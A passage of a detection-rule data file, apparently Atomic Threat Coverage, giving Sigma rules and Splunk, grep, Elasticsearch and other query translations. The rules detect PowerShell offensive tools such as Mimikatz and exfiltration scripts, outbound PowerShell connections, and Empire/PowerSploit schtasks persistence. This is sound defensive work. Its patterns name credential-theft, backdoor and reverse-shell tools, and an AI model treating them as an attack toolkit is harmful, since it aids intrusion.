OR TargetFilename=\"*\\\\\\\\Out-Minidump.ps1\" OR TargetFilename=\"*\\\\\\\\VolumeShadowCopyTools.ps1\" OR TargetFilename=\"*\\\\\\\\Invoke-ReflectivePEInjection.ps1\" OR TargetFilename=\"*\\\\\\\\Get-TimedScreenshot.ps1\" OR TargetFilename=\"*\\\\\\\\Invoke-UserHunter.ps1\" OR TargetFilename=\"*\\\\\\\\Find-GPOLocation.ps1\" OR TargetFilename=\"*\\\\\\\\Invoke-ACLScanner.ps1\" OR TargetFilename=\"*\\\\\\\\Invoke-DowngradeAccount.ps1\" OR TargetFilename=\"*\\\\\\\\Get-ServiceUnquoted.ps1\" OR TargetFilename=\"*\\\\\\\\Get-ServiceFilePermission.ps1\" OR TargetFilename=\"*\\\\\\\\Get-ServicePermission.ps1\" OR TargetFilename=\"*\\\\\\\\Invoke-ServiceAbuse.ps1\" OR TargetFilename=\"*\\\\\\\\Install-ServiceBinary.ps1\" OR TargetFilename=\"*\\\\\\\\Get-RegAutoLogon.ps1\" OR TargetFilename=\"*\\\\\\\\Get-VulnAutoRun.ps1\" OR TargetFilename=\"*\\\\\\\\Get-VulnSchTask.ps1\" OR TargetFilename=\"*\\\\\\\\Get-UnattendedInstallFile.ps1\" OR TargetFilename=\"*\\\\\\\\Get-WebConfig.ps1\" OR TargetFilename=\"*\\\\\\\\Get-ApplicationHost.ps1\" OR TargetFilename=\"*\\\\\\\\Get-RegAlwaysInstallElevated.ps1\" OR TargetFilename=\"*\\\\\\\\Get-Unconstrained.ps1\" OR TargetFilename=\"*\\\\\\\\Add-RegBackdoor.ps1\" OR TargetFilename=\"*\\\\\\\\Add-ScrnSaveBackdoor.ps1\" OR TargetFilename=\"*\\\\\\\\Gupt-Backdoor.ps1\" OR TargetFilename=\"*\\\\\\\\Invoke-ADSBackdoor.ps1\" OR TargetFilename=\"*\\\\\\\\Enabled-DuplicateToken.ps1\" OR TargetFilename=\"*\\\\\\\\Invoke-PsUaCme.ps1\" OR TargetFilename=\"*\\\\\\\\Remove-Update.ps1\" OR TargetFilename=\"*\\\\\\\\Check-VM.ps1\" OR TargetFilename=\"*\\\\\\\\Get-LSASecret.ps1\" OR TargetFilename=\"*\\\\\\\\Get-PassHashes.ps1\" OR TargetFilename=\"*\\\\\\\\Show-TargetScreen.ps1\" OR TargetFilename=\"*\\\\\\\\Port-Scan.ps1\" OR TargetFilename=\"*\\\\\\\\Invoke-PoshRatHttp.ps1\" OR TargetFilename=\"*\\\\\\\\Invoke-PowerShellTCP.ps1\" OR TargetFilename=\"*\\\\\\\\Invoke-PowerShellWMI.ps1\" OR TargetFilename=\"*\\\\\\\\Add-Exfiltration.ps1\" OR TargetFilename=\"*\\\\\\\\Add-Persistence.ps1\" OR TargetFilename=\"*\\\\\\\\Do-Exfiltration.ps1\" OR TargetFilename=\"*\\\\\\\\Start-CaptureServer.ps1\" OR TargetFilename=\"*\\\\\\\\Invoke-ShellCode.ps1\" OR TargetFilename=\"*\\\\\\\\Get-ChromeDump.ps1\" OR TargetFilename=\"*\\\\\\\\Get-ClipboardContents.ps1\" OR TargetFilename=\"*\\\\\\\\Get-FoxDump.ps1\" OR TargetFilename=\"*\\\\\\\\Get-IndexedItem.ps1\" OR TargetFilename=\"*\\\\\\\\Get-Screenshot.ps1\" OR TargetFilename=\"*\\\\\\\\Invoke-Inveigh.ps1\" OR TargetFilename=\"*\\\\\\\\Invoke-NetRipper.ps1\" OR TargetFilename=\"*\\\\\\\\Invoke-EgressCheck.ps1\" OR TargetFilename=\"*\\\\\\\\Invoke-PostExfil.ps1\" OR TargetFilename=\"*\\\\\\\\Invoke-PSInject.ps1\" OR TargetFilename=\"*\\\\\\\\Invoke-RunAs.ps1\" OR TargetFilename=\"*\\\\\\\\MailRaider.ps1\" OR TargetFilename=\"*\\\\\\\\New-HoneyHash.ps1\" OR TargetFilename=\"*\\\\\\\\Set-MacAttribute.ps1\" OR TargetFilename=\"*\\\\\\\\Invoke-DCSync.ps1\" OR TargetFilename=\"*\\\\\\\\Invoke-PowerDump.ps1\" OR TargetFilename=\"*\\\\\\\\Exploit-Jboss.ps1\" OR TargetFilename=\"*\\\\\\\\Invoke-ThunderStruck.ps1\" OR TargetFilename=\"*\\\\\\\\Invoke-VoiceTroll.ps1\" OR TargetFilename=\"*\\\\\\\\Set-Wallpaper.ps1\" OR TargetFilename=\"*\\\\\\\\Invoke-InveighRelay.ps1\" OR TargetFilename=\"*\\\\\\\\Invoke-PsExec.ps1\" OR TargetFilename=\"*\\\\\\\\Invoke-SSHCommand.ps1\" OR TargetFilename=\"*\\\\\\\\Get-SecurityPackages.ps1\" OR TargetFilename=\"*\\\\\\\\Install-SSP.ps1\" OR TargetFilename=\"*\\\\\\\\Invoke-BackdoorLNK.ps1\" OR TargetFilename=\"*\\\\\\\\PowerBreach.ps1\" OR TargetFilename=\"*\\\\\\\\Get-SiteListPassword.ps1\" OR TargetFilename=\"*\\\\\\\\Get-System.ps1\" OR TargetFilename=\"*\\\\\\\\Invoke-BypassUAC.ps1\" OR TargetFilename=\"*\\\\\\\\Invoke-Tater.ps1\" OR TargetFilename=\"*\\\\\\\\Invoke-WScriptBypassUAC.ps1\" OR TargetFilename=\"*\\\\\\\\PowerUp.ps1\" OR TargetFilename=\"*\\\\\\\\PowerView.ps1\" OR TargetFilename=\"*\\\\\\\\Get-RickAstley.ps1\" OR TargetFilename=\"*\\\\\\\\Find-Fruit.ps1\" OR TargetFilename=\"*\\\\\\\\HTTP-Login.ps1\" OR TargetFilename=\"*\\\\\\\\Find-TrustedDocuments.ps1\" OR TargetFilename=\"*\\\\\\\\Invoke-Paranoia.ps1\" OR TargetFilename=\"*\\\\\\\\Invoke-WinEnum.ps1\" OR TargetFilename=\"*\\\\\\\\Invoke-ARPScan.ps1\" OR TargetFilename=\"*\\\\\\\\Invoke-PortScan.ps1\" OR TargetFilename=\"*\\\\\\\\Invoke-ReverseDNSLookup.ps1\" OR TargetFilename=\"*\\\\\\\\Invoke-SMBScanner.ps1\" OR TargetFilename=\"*\\\\\\\\Invoke-Mimikittenz.ps1\"))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"11\" TargetFilename IN [\"*\\\\\\\\Invoke-DllInjection.ps1\", \"*\\\\\\\\Invoke-WmiCommand.ps1\", \"*\\\\\\\\Get-GPPPassword.ps1\", \"*\\\\\\\\Get-Keystrokes.ps1\", \"*\\\\\\\\Get-VaultCredential.ps1\", \"*\\\\\\\\Invoke-CredentialInjection.ps1\", \"*\\\\\\\\Invoke-Mimikatz.ps1\", \"*\\\\\\\\Invoke-NinjaCopy.ps1\", \"*\\\\\\\\Invoke-TokenManipulation.ps1\", \"*\\\\\\\\Out-Minidump.ps1\", \"*\\\\\\\\VolumeShadowCopyTools.ps1\", \"*\\\\\\\\Invoke-ReflectivePEInjection.ps1\", \"*\\\\\\\\Get-TimedScreenshot.ps1\", \"*\\\\\\\\Invoke-UserHunter.ps1\", \"*\\\\\\\\Find-GPOLocation.ps1\", \"*\\\\\\\\Invoke-ACLScanner.ps1\", \"*\\\\\\\\Invoke-DowngradeAccount.ps1\", \"*\\\\\\\\Get-ServiceUnquoted.ps1\", \"*\\\\\\\\Get-ServiceFilePermission.ps1\", \"*\\\\\\\\Get-ServicePermission.ps1\", \"*\\\\\\\\Invoke-ServiceAbuse.ps1\", \"*\\\\\\\\Install-ServiceBinary.ps1\", \"*\\\\\\\\Get-RegAutoLogon.ps1\", \"*\\\\\\\\Get-VulnAutoRun.ps1\", \"*\\\\\\\\Get-VulnSchTask.ps1\", \"*\\\\\\\\Get-UnattendedInstallFile.ps1\", \"*\\\\\\\\Get-WebConfig.ps1\", \"*\\\\\\\\Get-ApplicationHost.ps1\", \"*\\\\\\\\Get-RegAlwaysInstallElevated.ps1\", \"*\\\\\\\\Get-Unconstrained.ps1\", \"*\\\\\\\\Add-RegBackdoor.ps1\", \"*\\\\\\\\Add-ScrnSaveBackdoor.ps1\", \"*\\\\\\\\Gupt-Backdoor.ps1\", \"*\\\\\\\\Invoke-ADSBackdoor.ps1\", \"*\\\\\\\\Enabled-DuplicateToken.ps1\", \"*\\\\\\\\Invoke-PsUaCme.ps1\", \"*\\\\\\\\Remove-Update.ps1\", \"*\\\\\\\\Check-VM.ps1\", \"*\\\\\\\\Get-LSASecret.ps1\", \"*\\\\\\\\Get-PassHashes.ps1\", \"*\\\\\\\\Show-TargetScreen.ps1\", \"*\\\\\\\\Port-Scan.ps1\", \"*\\\\\\\\Invoke-PoshRatHttp.ps1\", \"*\\\\\\\\Invoke-PowerShellTCP.ps1\", \"*\\\\\\\\Invoke-PowerShellWMI.ps1\", \"*\\\\\\\\Add-Exfiltration.ps1\", \"*\\\\\\\\Add-Persistence.ps1\", \"*\\\\\\\\Do-Exfiltration.ps1\", \"*\\\\\\\\Start-CaptureServer.ps1\", \"*\\\\\\\\Invoke-ShellCode.ps1\", \"*\\\\\\\\Get-ChromeDump.ps1\", \"*\\\\\\\\Get-ClipboardContents.ps1\", \"*\\\\\\\\Get-FoxDump.ps1\", \"*\\\\\\\\Get-IndexedItem.ps1\", \"*\\\\\\\\Get-Screenshot.ps1\", \"*\\\\\\\\Invoke-Inveigh.ps1\", \"*\\\\\\\\Invoke-NetRipper.ps1\", \"*\\\\\\\\Invoke-EgressCheck.ps1\", \"*\\\\\\\\Invoke-PostExfil.ps1\", \"*\\\\\\\\Invoke-PSInject.ps1\", \"*\\\\\\\\Invoke-RunAs.ps1\", \"*\\\\\\\\MailRaider.ps1\", \"*\\\\\\\\New-HoneyHash.ps1\", \"*\\\\\\\\Set-MacAttribute.ps1\", \"*\\\\\\\\Invoke-DCSync.ps1\", \"*\\\\\\\\Invoke-PowerDump.ps1\", \"*\\\\\\\\Exploit-Jboss.ps1\", \"*\\\\\\\\Invoke-ThunderStruck.ps1\", \"*\\\\\\\\Invoke-VoiceTroll.ps1\", \"*\\\\\\\\Set-Wallpaper.ps1\", \"*\\\\\\\\Invoke-InveighRelay.ps1\", \"*\\\\\\\\Invoke-PsExec.ps1\", \"*\\\\\\\\Invoke-SSHCommand.ps1\", \"*\\\\\\\\Get-SecurityPackages.ps1\", \"*\\\\\\\\Install-SSP.ps1\", \"*\\\\\\\\Invoke-BackdoorLNK.ps1\", \"*\\\\\\\\PowerBreach.ps1\", \"*\\\\\\\\Get-SiteListPassword.ps1\", \"*\\\\\\\\Get-System.ps1\", \"*\\\\\\\\Invoke-BypassUAC.ps1\", \"*\\\\\\\\Invoke-Tater.ps1\", \"*\\\\\\\\Invoke-WScriptBypassUAC.ps1\", \"*\\\\\\\\PowerUp.ps1\", \"*\\\\\\\\PowerView.ps1\", \"*\\\\\\\\Get-RickAstley.ps1\", \"*\\\\\\\\Find-Fruit.ps1\", \"*\\\\\\\\HTTP-Login.ps1\", \"*\\\\\\\\Find-TrustedDocuments.ps1\", \"*\\\\\\\\Invoke-Paranoia.ps1\", \"*\\\\\\\\Invoke-WinEnum.ps1\", \"*\\\\\\\\Invoke-ARPScan.ps1\", \"*\\\\\\\\Invoke-PortScan.ps1\", \"*\\\\\\\\Invoke-ReverseDNSLookup.ps1\", \"*\\\\\\\\Invoke-SMBScanner.ps1\", \"*\\\\\\\\Invoke-Mimikittenz.ps1\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*11)(?=.*(?:.*.*\\\\Invoke-DllInjection\\\\.ps1|.*.*\\\\Invoke-WmiCommand\\\\.ps1|.*.*\\\\Get-GPPPassword\\\\.ps1|.*.*\\\\Get-Keystrokes\\\\.ps1|.*.*\\\\Get-VaultCredential\\\\.ps1|.*.*\\\\Invoke-CredentialInjection\\\\.ps1|.*.*\\\\Invoke-Mimikatz\\\\.ps1|.*.*\\\\Invoke-NinjaCopy\\\\.ps1|.*.*\\\\Invoke-TokenManipulation\\\\.ps1|.*.*\\\\Out-Minidump\\\\.ps1|.*.*\\\\VolumeShadowCopyTools\\\\.ps1|.*.*\\\\Invoke-ReflectivePEInjection\\\\.ps1|.*.*\\\\Get-TimedScreenshot\\\\.ps1|.*.*\\\\Invoke-UserHunter\\\\.ps1|.*.*\\\\Find-GPOLocation\\\\.ps1|.*.*\\\\Invoke-ACLScanner\\\\.ps1|.*.*\\\\Invoke-DowngradeAccount\\\\.ps1|.*.*\\\\Get-ServiceUnquoted\\\\.ps1|.*.*\\\\Get-ServiceFilePermission\\\\.ps1|.*.*\\\\Get-ServicePermission\\\\.ps1|.*.*\\\\Invoke-ServiceAbuse\\\\.ps1|.*.*\\\\Install-ServiceBinary\\\\.ps1|.*.*\\\\Get-RegAutoLogon\\\\.ps1|.*.*\\\\Get-VulnAutoRun\\\\.ps1|.*.*\\\\Get-VulnSchTask\\\\.ps1|.*.*\\\\Get-UnattendedInstallFile\\\\.ps1|.*.*\\\\Get-WebConfig\\\\.ps1|.*.*\\\\Get-ApplicationHost\\\\.ps1|.*.*\\\\Get-RegAlwaysInstallElevated\\\\.ps1|.*.*\\\\Get-Unconstrained\\\\.ps1|.*.*\\\\Add-RegBackdoor\\\\.ps1|.*.*\\\\Add-ScrnSaveBackdoor\\\\.ps1|.*.*\\\\Gupt-Backdoor\\\\.ps1|.*.*\\\\Invoke-ADSBackdoor\\\\.ps1|.*.*\\\\Enabled-DuplicateToken\\\\.ps1|.*.*\\\\Invoke-PsUaCme\\\\.ps1|.*.*\\\\Remove-Update\\\\.ps1|.*.*\\\\Check-VM\\\\.ps1|.*.*\\\\Get-LSASecret\\\\.ps1|.*.*\\\\Get-PassHashes\\\\.ps1|.*.*\\\\Show-TargetScreen\\\\.ps1|.*.*\\\\Port-Scan\\\\.ps1|.*.*\\\\Invoke-PoshRatHttp\\\\.ps1|.*.*\\\\Invoke-PowerShellTCP\\\\.ps1|.*.*\\\\Invoke-PowerShellWMI\\\\.ps1|.*.*\\\\Add-Exfiltration\\\\.ps1|.*.*\\\\Add-Persistence\\\\.ps1|.*.*\\\\Do-Exfiltration\\\\.ps1|.*.*\\\\Start-CaptureServer\\\\.ps1|.*.*\\\\Invoke-ShellCode\\\\.ps1|.*.*\\\\Get-ChromeDump\\\\.ps1|.*.*\\\\Get-ClipboardContents\\\\.ps1|.*.*\\\\Get-FoxDump\\\\.ps1|.*.*\\\\Get-IndexedItem\\\\.ps1|.*.*\\\\Get-Screenshot\\\\.ps1|.*.*\\\\Invoke-Inveigh\\\\.ps1|.*.*\\\\Invoke-NetRipper\\\\.ps1|.*.*\\\\Invoke-EgressCheck\\\\.ps1|.*.*\\\\Invoke-PostExfil\\\\.ps1|.*.*\\\\Invoke-PSInject\\\\.ps1|.*.*\\\\Invoke-RunAs\\\\.ps1|.*.*\\\\MailRaider\\\\.ps1|.*.*\\\\New-HoneyHash\\\\.ps1|.*.*\\\\Set-MacAttribute\\\\.ps1|.*.*\\\\Invoke-DCSync\\\\.ps1|.*.*\\\\Invoke-PowerDump\\\\.ps1|.*.*\\\\Exploit-Jboss\\\\.ps1|.*.*\\\\Invoke-ThunderStruck\\\\.ps1|.*.*\\\\Invoke-VoiceTroll\\\\.ps1|.*.*\\\\Set-Wallpaper\\\\.ps1|.*.*\\\\Invoke-InveighRelay\\\\.ps1|.*.*\\\\Invoke-PsExec\\\\.ps1|.*.*\\\\Invoke-SSHCommand\\\\.ps1|.*.*\\\\Get-SecurityPackages\\\\.ps1|.*.*\\\\Install-SSP\\\\.ps1|.*.*\\\\Invoke-BackdoorLNK\\\\.ps1|.*.*\\\\PowerBreach\\\\.ps1|.*.*\\\\Get-SiteListPassword\\\\.ps1|.*.*\\\\Get-System\\\\.ps1|.*.*\\\\Invoke-BypassUAC\\\\.ps1|.*.*\\\\Invoke-Tater\\\\.ps1|.*.*\\\\Invoke-WScriptBypassUAC\\\\.ps1|.*.*\\\\PowerUp\\\\.ps1|.*.*\\\\PowerView\\\\.ps1|.*.*\\\\Get-RickAstley\\\\.ps1|.*.*\\\\Find-Fruit\\\\.ps1|.*.*\\\\HTTP-Login\\\\.ps1|.*.*\\\\Find-TrustedDocuments\\\\.ps1|.*.*\\\\Invoke-Paranoia\\\\.ps1|.*.*\\\\Invoke-WinEnum\\\\.ps1|.*.*\\\\Invoke-ARPScan\\\\.ps1|.*.*\\\\Invoke-PortScan\\\\.ps1|.*.*\\\\Invoke-ReverseDNSLookup\\\\.ps1|.*.*\\\\Invoke-SMBScanner\\\\.ps1|.*.*\\\\Invoke-Mimikittenz\\\\.ps1)))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: PowerShell Network Connections\nid: 1f21ec3f-810d-4b0e-8045-322202e22b4b\nstatus: experimental\ndescription: Detects a Powershell process that opens network connections - check for suspicious target ports and target systems - adjust to your environment (e.g.\n    extend filters with company's ip range')\nauthor: Florian Roth\nreferences:\n    - https://www.youtube.com/watch?v=DLtJTxMWZ2o\ntags:\n    - attack.execution\n    - attack.t1086\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection:\n        EventID: 3\n        Image: '*\\powershell.exe'\n        Initiated: 'true'\n    filter:\n        DestinationIp: \n            - '10.*'\n            - '192.168.*'\n            - '172.16.*'\n            - '172.17.*'\n            - '172.18.*'\n            - '172.19.*'\n            - '172.20.*'\n            - '172.21.*'\n            - '172.22.*'\n            - '172.23.*'\n            - '172.24.*'\n            - '172.25.*'\n            - '172.26.*'\n            - '172.27.*'\n            - '172.28.*'\n            - '172.29.*'\n            - '172.30.*'\n            - '172.31.*'\n            - '127.0.0.1'\n        DestinationIsIpv6: 'false'\n        User: 'NT AUTHORITY\\SYSTEM'\n    condition: selection and not filter\nfalsepositives:\n    - Administrative scripts\nlevel: low", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: PowerShell Network Connections\nid: 1f21ec3f-810d-4b0e-8045-322202e22b4b\nstatus: experimental\ndescription: Detects a Powershell process that opens network connections - check for suspicious target ports and target systems - adjust to your environment (e.g.\n    extend filters with company's ip range')\nauthor: Florian Roth\nreferences:\n    - https://www.youtube.com/watch?v=DLtJTxMWZ2o\ntags:\n    - attack.execution\n    - attack.t1086\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection:\n        EventID: 3\n        Image: '*\\powershell.exe'\n        Initiated: 'true'\n    filter:\n        DestinationIp: \n            - '10.*'\n            - '192.168.*'\n            - '172.16.*'\n            - '172.17.*'\n            - '172.18.*'\n            - '172.19.*'\n            - '172.20.*'\n            - '172.21.*'\n            - '172.22.*'\n            - '172.23.*'\n            - '172.24.*'\n            - '172.25.*'\n            - '172.26.*'\n            - '172.27.*'\n            - '172.28.*'\n            - '172.29.*'\n            - '172.30.*'\n            - '172.31.*'\n            - '127.0.0.1'\n        DestinationIsIpv6: 'false'\n        User: 'NT AUTHORITY\\SYSTEM'\n    condition: selection and not filter\nfalsepositives:\n    - Administrative scripts\nlevel: low", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "((EventID:\"3\" AND Image.keyword:*\\\\\\\\powershell.exe AND Initiated:\"true\") AND (NOT (DestinationIp.keyword:(10.* OR 192.168.* OR 172.16.* OR 172.17.* OR 172.18.* OR 172.19.* OR 172.20.* OR 172.21.* OR 172.22.* OR 172.23.* OR 172.24.* OR 172.25.* OR 172.26.* OR 172.27.* OR 172.28.* OR 172.29.* OR 172.30.* OR 172.31.* OR 127.0.0.1) AND DestinationIsIpv6:\"false\" AND User:\"NT\\\\ AUTHORITY\\\\\\\\SYSTEM\")))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/PowerShell-Network-Connections <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"PowerShell Network Connections\",\\n    \"description\": \"Detects a Powershell process that opens network connections - check for suspicious target ports and target systems - adjust to your environment (e.g. extend filters with company\\'s ip range\\')\",\\n    \"tags\": [\\n      \"attack.execution\",\\n      \"attack.t1086\"\\n    ],\\n    \"query\": \"((EventID:\\\\\"3\\\\\" AND Image.keyword:*\\\\\\\\\\\\\\\\powershell.exe AND Initiated:\\\\\"true\\\\\") AND (NOT (DestinationIp.keyword:(10.* OR 192.168.* OR 172.16.* OR 172.17.* OR 172.18.* OR 172.19.* OR 172.20.* OR 172.21.* OR 172.22.* OR 172.23.* OR 172.24.* OR 172.25.* OR 172.26.* OR 172.27.* OR 172.28.* OR 172.29.* OR 172.30.* OR 172.31.* OR 127.0.0.1) AND DestinationIsIpv6:\\\\\"false\\\\\" AND User:\\\\\"NT\\\\\\\\ AUTHORITY\\\\\\\\\\\\\\\\SYSTEM\\\\\")))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"((EventID:\\\\\"3\\\\\" AND Image.keyword:*\\\\\\\\\\\\\\\\powershell.exe AND Initiated:\\\\\"true\\\\\") AND (NOT (DestinationIp.keyword:(10.* OR 192.168.* OR 172.16.* OR 172.17.* OR 172.18.* OR 172.19.* OR 172.20.* OR 172.21.* OR 172.22.* OR 172.23.* OR 172.24.* OR 172.25.* OR 172.26.* OR 172.27.* OR 172.28.* OR 172.29.* OR 172.30.* OR 172.31.* OR 127.0.0.1) AND DestinationIsIpv6:\\\\\"false\\\\\" AND User:\\\\\"NT\\\\\\\\ AUTHORITY\\\\\\\\\\\\\\\\SYSTEM\\\\\")))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'PowerShell Network Connections\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "((EventID:\"3\" AND Image.keyword:*\\\\\\\\powershell.exe AND Initiated:\"true\") AND (NOT (DestinationIp.keyword:(10.* 192.168.* 172.16.* 172.17.* 172.18.* 172.19.* 172.20.* 172.21.* 172.22.* 172.23.* 172.24.* 172.25.* 172.26.* 172.27.* 172.28.* 172.29.* 172.30.* 172.31.* 127.0.0.1) AND DestinationIsIpv6:\"false\" AND User:\"NT AUTHORITY\\\\\\\\SYSTEM\")))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((EventID=\"3\" Image=\"*\\\\\\\\powershell.exe\" Initiated=\"true\") NOT ((DestinationIp=\"10.*\" OR DestinationIp=\"192.168.*\" OR DestinationIp=\"172.16.*\" OR DestinationIp=\"172.17.*\" OR DestinationIp=\"172.18.*\" OR DestinationIp=\"172.19.*\" OR DestinationIp=\"172.20.*\" OR DestinationIp=\"172.21.*\" OR DestinationIp=\"172.22.*\" OR DestinationIp=\"172.23.*\" OR DestinationIp=\"172.24.*\" OR DestinationIp=\"172.25.*\" OR DestinationIp=\"172.26.*\" OR DestinationIp=\"172.27.*\" OR DestinationIp=\"172.28.*\" OR DestinationIp=\"172.29.*\" OR DestinationIp=\"172.30.*\" OR DestinationIp=\"172.31.*\" OR DestinationIp=\"127.0.0.1\") DestinationIsIpv6=\"false\" User=\"NT AUTHORITY\\\\\\\\SYSTEM\"))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "((event_id=\"3\" Image=\"*\\\\\\\\powershell.exe\" Initiated=\"true\")  -(DestinationIp IN [\"10.*\", \"192.168.*\", \"172.16.*\", \"172.17.*\", \"172.18.*\", \"172.19.*\", \"172.20.*\", \"172.21.*\", \"172.22.*\", \"172.23.*\", \"172.24.*\", \"172.25.*\", \"172.26.*\", \"172.27.*\", \"172.28.*\", \"172.29.*\", \"172.30.*\", \"172.31.*\", \"127.0.0.1\"] DestinationIsIpv6=\"false\" User=\"NT AUTHORITY\\\\\\\\SYSTEM\"))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*(?:.*(?=.*3)(?=.*.*\\\\powershell\\\\.exe)(?=.*true)))(?=.*(?!.*(?:.*(?=.*(?:.*10\\\\..*|.*192\\\\.168\\\\..*|.*172\\\\.16\\\\..*|.*172\\\\.17\\\\..*|.*172\\\\.18\\\\..*|.*172\\\\.19\\\\..*|.*172\\\\.20\\\\..*|.*172\\\\.21\\\\..*|.*172\\\\.22\\\\..*|.*172\\\\.23\\\\..*|.*172\\\\.24\\\\..*|.*172\\\\.25\\\\..*|.*172\\\\.26\\\\..*|.*172\\\\.27\\\\..*|.*172\\\\.28\\\\..*|.*172\\\\.29\\\\..*|.*172\\\\.30\\\\..*|.*172\\\\.31\\\\..*|.*127\\\\.0\\\\.0\\\\.1))(?=.*false)(?=.*NT AUTHORITY\\\\SYSTEM)))))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Default PowerSploit and Empire Schtasks Persistence\nstatus: experimental\ndescription: Detects the creation of a schtask via PowerSploit or Empire Default Configuration.\nreferences:\n    - https://github.com/0xdeadbeefJERKY/PowerSploit/blob/8690399ef70d2cad10213575ac67e8fa90ddf7c3/Persistence/Persistence.psm1\n    - https://github.com/EmpireProject/Empire/blob/master/lib/modules/powershell/persistence/userland/schtasks.py\n    - https://github.com/EmpireProject/Empire/blob/master/lib/modules/powershell/persistence/elevated/schtasks.py\nauthor: Markus Neis, @Karneades\ndate: 2018/03/06\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection:\n        ParentImage:\n            - '*\\Powershell.exe'\n        CommandLine:\n            - '*schtasks*/Create*/SC *ONLOGON*/TN *Updater*/TR *powershell*'\n            - '*schtasks*/Create*/SC *DAILY*/TN *Updater*/TR *powershell*'\n            - '*schtasks*/Create*/SC *ONIDLE*/TN *Updater*/TR *powershell*'\n            - '*schtasks*/Create*/SC *Updater*/TN *Updater*/TR *powershell*'\n    condition: selection\ntags:\n    - attack.execution\n    - attack.persistence\n    - attack.privilege_escalation\n    - attack.t1053\n    - attack.t1086\n    - attack.s0111\n    - attack.g0022\n    - attack.g0060\n    - car.2013-08-001\nfalsepositives:\n    - False positives are possible, depends on organisation and processes\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Default PowerSploit and Empire Schtasks Persistence\nstatus: experimental\ndescription: Detects the creation of a schtask via PowerSploit or Empire Default Configuration.\nreferences:\n    - https://github.com/0xdeadbeefJERKY/PowerSploit/blob/8690399ef70d2cad10213575ac67e8fa90ddf7c3/Persistence/Persistence.psm1\n    - https://github.com/EmpireProject/Empire/blob/master/lib/modules/powershell/persistence/userland/schtasks.py\n    - https://github.com/EmpireProject/Empire/blob/master/lib/modules/powershell/persistence/elevated/schtasks.py\nauthor: Markus Neis, @Karneades\ndate: 2018/03/06\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection:\n        ParentImage:\n            - '*\\Powershell.exe'\n        CommandLine:\n            - '*schtasks*/Create*/SC *ONLOGON*/TN *Updater*/TR *powershell*'\n            - '*schtasks*/Create*/SC *DAILY*/TN *Updater*/TR *powershell*'\n            - '*schtasks*/Create*/SC *ONIDLE*/TN *Updater*/TR *powershell*'\n            - '*schtasks*/Create*/SC *Updater*/TN *Updater*/TR *powershell*'\n    condition: selection\ntags:\n    - attack.execution\n    - attack.persistence\n    - attack.privilege_escalation\n    - attack.t1053\n    - attack.t1086\n    - attack.s0111\n    - attack.g0022\n    - attack.g0060\n    - car.2013-08-001\nfalsepositives:\n    - False positives are possible, depends on organisation and processes\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(ParentImage.keyword:(*\\\\\\\\Powershell.exe) AND CommandLine.keyword:(*schtasks*\\\\/Create*\\\\/SC\\\\ *ONLOGON*\\\\/TN\\\\ *Updater*\\\\/TR\\\\ *powershell* OR *schtasks*\\\\/Create*\\\\/SC\\\\ *DAILY*\\\\/TN\\\\ *Updater*\\\\/TR\\\\ *powershell* OR *schtasks*\\\\/Create*\\\\/SC\\\\ *ONIDLE*\\\\/TN\\\\ *Updater*\\\\/TR\\\\ *powershell* OR *schtasks*\\\\/Create*\\\\/SC\\\\ *Updater*\\\\/TN\\\\ *Updater*\\\\/TR\\\\ *powershell*))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Default-PowerSploit-and-Empire-Schtasks-Persistence <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Default PowerSploit and Empire Schtasks Persistence\",\\n    \"description\": \"Detects the creation of a schtask via PowerSploit or Empire Default Configuration.\",\\n    \"tags\": [\\n      \"attack.execution\",\\n      \"attack.persistence\",\\n      \"attack.privilege_escalation\",\\n      \"attack.t1053\",\\n      \"attack.t1086\",\\n      \"attack.s0111\",\\n      \"attack.g0022\",\\n      \"attack.g0060\",\\n      \"car.2013-08-001\"\\n    ],\\n    \"query\": \"(ParentImage.keyword:(*\\\\\\\\\\\\\\\\Powershell.exe) AND 